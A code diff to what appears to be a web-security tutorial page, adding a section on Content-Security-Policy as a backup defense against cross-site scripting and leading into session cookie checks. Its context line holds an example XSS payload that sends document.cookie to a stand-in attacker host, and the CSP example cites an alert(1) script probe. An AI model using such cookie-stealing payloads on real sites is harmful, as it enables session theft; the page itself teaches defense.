@@ -69,6 +69,24 @@ fetch('https://attacker.example/steal?c=' + document.cookie)
         not chasing false positives across a large target.
       </p>
 
+      <h2>Content-Security-Policy: a second line of defense against XSS itself</h2>
+      <p>
+        Everything above about encoding output is the primary fix — CSP is the defense-in-depth layer for
+        when that primary fix has a gap somewhere a reviewer missed. A strict CSP response header tells the
+        browser which sources of script it's allowed to execute at all, so even a successfully injected{' '}
+        <code>&lt;script&gt;</code> tag simply refuses to run if it violates the policy:
+      </p>
+      <CodeBlock label="a CSP that blocks the classic reflected-XSS payload from executing">{`Content-Security-Policy: default-src 'self'; script-src 'self'
+# scripts may only load from the site's own origin — an injected <script>alert(1)</script>
+# is still reflected into the page, but the browser refuses to execute it,
+# because inline scripts with no 'unsafe-inline' directive are blocked by default`}</CodeBlock>
+      <p>
+        The reason this counts as defense-in-depth rather than the actual fix: CSP is easy to misconfigure
+        (a stray <code>'unsafe-inline'</code> or an overly broad <code>script-src *</code> reopens the exact
+        hole it exists to close), and it protects the browser's execution of the payload, not the underlying
+        encoding bug — always fix the root cause first, and treat CSP as the safety net behind it.
+      </p>
+
       <h2>Session attacks: cookies and tokens</h2>
       <CodeBlock label="what to check on every session cookie">{`Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
 
